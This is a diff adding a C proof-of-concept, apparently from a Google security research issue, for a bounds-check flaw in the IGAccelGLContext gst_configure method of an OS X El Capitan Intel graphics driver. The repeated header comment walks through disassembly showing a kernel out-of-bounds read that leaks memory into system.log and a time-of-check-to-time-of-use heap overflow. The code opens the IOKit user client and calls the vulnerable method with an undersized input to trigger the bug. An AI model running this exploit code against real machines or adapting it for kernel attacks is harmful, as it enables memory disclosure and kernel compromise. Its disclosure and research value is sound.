@@ -1,0 +1,223 @@
+/*
+Source: https://code.google.com/p/google-security-research/issues/detail?id=596
+
+The external method 0x206 of IGAccelGLContext is gst_configure. This method takes an arbitrary sized input structure
+(passed in rsi) but doesn't check the size of that structure (passed in rcx.)
+
+__text:000000000002A366 __ZN16IGAccelGLContext13gst_configureEP19GstConfigurationRecS1_jPj proc near
+__text:000000000002A366                                         ; DATA XREF: __const:000000000005BF88o
+__text:000000000002A366                 push    rbp
+__text:000000000002A367                 mov     rbp, rsp
+__text:000000000002A36A                 push    r15
+__text:000000000002A36C                 push    r14
+__text:000000000002A36E                 push    r12
+__text:000000000002A370                 push    rbx
+__text:000000000002A371                 mov     rax, rdx
+__text:000000000002A374                 mov     r15, rsi         ; <-- r15 points to controlled mach message data
+__text:000000000002A377                 mov     r14, rdi
+__text:000000000002A37A                 mov     edx, [r15+800h]  ; <-- size never checked -> oob read
+__text:000000000002A381                 cmp     edx, 200h
+__text:000000000002A387                 jbe     short loc_2A3AD
+__text:000000000002A389                 lea     rdi, aIgaccelglcon_0 ; "IGAccelGLContext::%s Error: Number of e"...
+__text:000000000002A390                 lea     rsi, aGst_configure ; "gst_configure"
+__text:000000000002A397                 mov     ecx, 200h
+__text:000000000002A39C                 xor     eax, eax
+__text:000000000002A39E                 call    _IOLog
+
+
+here we can see that the method is reading a dword at offset 0x800 of the input struct and comparing that value to 0x200.
+This method is reached via MIG and if we call userspace IOConnectCallMethod with a small input struct then the mach
+message is actually packed such that only the input struct size we send actually gets sent; therefore this is an OOB read.
+
+The first interesting conseqeuence of this is that if the value read is > 0x200 then it gets logged to /var/log/system.log
+which we can read from userspace allowing us to disclose some kernel memory.
+
+However, we can do more:
+
+r15 is passed to IntelAccelerator::gstqConfigure:
+
+mov     rsi, r15
+call    __ZN16IntelAccelerator13gstqConfigureEP19GstConfigurationRec
+
+where we reach the following code:
+
+__text:000000000001DC29                 mov     edx, [rsi+800h]
+__text:000000000001DC2F                 shl     rdx, 2          ; size_t
+__text:000000000001DC33                 lea     rdi, _gstCustomCounterConfigPair ; void *
+__text:000000000001DC3A                 call    _memcpy
+
+here the value at +0x800 is read again and used as the size for a memcpy assuming that it has already been verified, but
+since it's outside the bounds of the allocation this is actually a toctou bug since with some heap manipulation we can
+change that value to be > 0x200 allowing us to overflow the _gstCustomCounterConfigPair buffer.
+
+Since the struct input comes from a mach message this heap grooming shouldn't be that difficult.
+
+clang -o ig_gl_gst_oob_read ig_gl_gst_oob_read.c -framework IOKit
+
+repro: while true; ./ig_gl_gst_oob_read; done
+
+Tested on OS X ElCapitan 10.11.1 (15b42) on MacBookAir5,2
+*/
+
+// ianbeer
+/*
+Lack of bounds checking in gst_configure leads to kernel buffer overflow due to toctou (plus kernel memory disclosure)
+
+The external method 0x206 of IGAccelGLContext is gst_configure. This method takes an arbitrary sized input structure
+(passed in rsi) but doesn't check the size of that structure (passed in rcx.)
+
+__text:000000000002A366 __ZN16IGAccelGLContext13gst_configureEP19GstConfigurationRecS1_jPj proc near
+__text:000000000002A366                                         ; DATA XREF: __const:000000000005BF88o
+__text:000000000002A366                 push    rbp
+__text:000000000002A367                 mov     rbp, rsp
+__text:000000000002A36A                 push    r15
+__text:000000000002A36C                 push    r14
+__text:000000000002A36E                 push    r12
+__text:000000000002A370                 push    rbx
+__text:000000000002A371                 mov     rax, rdx
+__text:000000000002A374                 mov     r15, rsi         ; <-- r15 points to controlled mach message data
+__text:000000000002A377                 mov     r14, rdi
+__text:000000000002A37A                 mov     edx, [r15+800h]  ; <-- size never checked -> oob read
+__text:000000000002A381                 cmp     edx, 200h
+__text:000000000002A387                 jbe     short loc_2A3AD
+__text:000000000002A389                 lea     rdi, aIgaccelglcon_0 ; "IGAccelGLContext::%s Error: Number of e"...
+__text:000000000002A390                 lea     rsi, aGst_configure ; "gst_configure"
+__text:000000000002A397                 mov     ecx, 200h
+__text:000000000002A39C                 xor     eax, eax
+__text:000000000002A39E                 call    _IOLog
+
+
+here we can see that the method is reading a dword at offset 0x800 of the input struct and comparing that value to 0x200.
+This method is reached via MIG and if we call userspace IOConnectCallMethod with a small input struct then the mach
+message is actually packed such that only the input struct size we send actually gets sent; therefore this is an OOB read.
+
+The first interesting conseqeuence of this is that if the value read is > 0x200 then it gets logged to /var/log/system.log
+which we can read from userspace allowing us to disclose some kernel memory.
+
+However, we can do more:
+
+r15 is passed to IntelAccelerator::gstqConfigure:
+
+mov     rsi, r15
+call    __ZN16IntelAccelerator13gstqConfigureEP19GstConfigurationRec
+
+where we reach the following code:
+
+__text:000000000001DC29                 mov     edx, [rsi+800h]
+__text:000000000001DC2F                 shl     rdx, 2          ; size_t
+__text:000000000001DC33                 lea     rdi, _gstCustomCounterConfigPair ; void *
+__text:000000000001DC3A                 call    _memcpy
+
+here the value at +0x800 is read again and used as the size for a memcpy assuming that it has already been verified, but
+since it's outside the bounds of the allocation this is actually a toctou bug since with some heap manipulation we can
+change that value to be > 0x200 allowing us to overflow the _gstCustomCounterConfigPair buffer.
+
+Since the struct input comes from a mach message this heap grooming shouldn't be that difficult.
+
+clang -o ig_gl_gst_oob_read ig_gl_gst_oob_read.c -framework IOKit
+
+repro: while true; ./ig_gl_gst_oob_read; done
+
+Tested on OS X ElCapitan 10.11.1 (15b42) on MacBookAir5,2
+*/
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#include <mach/mach.h>
+#include <mach/vm_map.h>
+#include <sys/mman.h>
+
+#include <IOKit/IOKitLib.h>
+
+int main(int argc, char** argv){
+  kern_return_t err;
+  
+  CFMutableDictionaryRef matching = IOServiceMatching("IntelAccelerator");
+  if(!matching){
+   printf("unable to create service matching dictionary\n");
+   return 0;
+  }
+
+  io_iterator_t iterator;
+  err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
+  if (err != KERN_SUCCESS){
+   printf("no matches\n");
+   return 0;
+  }
+
+  io_service_t service = IOIteratorNext(iterator);
+  
+  if (service == IO_OBJECT_NULL){
+   printf("unable to find service\n");
+   return 0;
+  }
+  printf("got service: %x\n", service);
+
+  io_connect_t conn = MACH_PORT_NULL;
+  err = IOServiceOpen(service, mach_task_self(), 1, &conn); // type 1 == IGAccelGLContext
+  if (err != KERN_SUCCESS){
+   printf("unable to get user client connection\n");
+   return 0;
+  }
+
+  printf("got userclient connection: %x\n", conn);
+  
+  uint64_t inputScalar[16];  
+  uint64_t inputScalarCnt = 0;
+
+  char inputStruct[4096];
+  size_t inputStructCnt = 0;
+
+  uint64_t outputScalar[16];
+  uint32_t outputScalarCnt = 0;
+
+  char outputStruct[4096];
+  size_t outputStructCnt = 0;
+
+  inputScalarCnt = 0;
+  inputStructCnt = 0;
+
+  outputScalarCnt = 0;
+  outputStructCnt = 0;
+
+  inputStructCnt = 0x30;
+
+  err = IOConnectCallMethod(
+   conn,
+   0x205,                 //gst_operation
+   inputScalar,
+   inputScalarCnt,
+   inputStruct,
+   inputStructCnt,
+   outputScalar,
+   &outputScalarCnt,
+   outputStruct,
+   &outputStructCnt); 
+
+  if (err != KERN_SUCCESS){
+   printf("IOConnectCall error: %x\n", err);
+   printf("that was an error in the first call, don't care!\n");
+  }
+  
+
+  
+  inputStructCnt = 0x1;
+
+  err = IOConnectCallMethod(
+   conn,
+   0x206,                 //gst_configure
+   inputScalar,
+   inputScalarCnt,
+   inputStruct,
+   inputStructCnt,
+   outputScalar,
+   &outputScalarCnt,
+   outputStruct,
+   &outputStructCnt); 
+
+  if (err != KERN_SUCCESS){
+   printf("IOConnectCall error: %x\n", err);
+   return 0;
+  }
+}
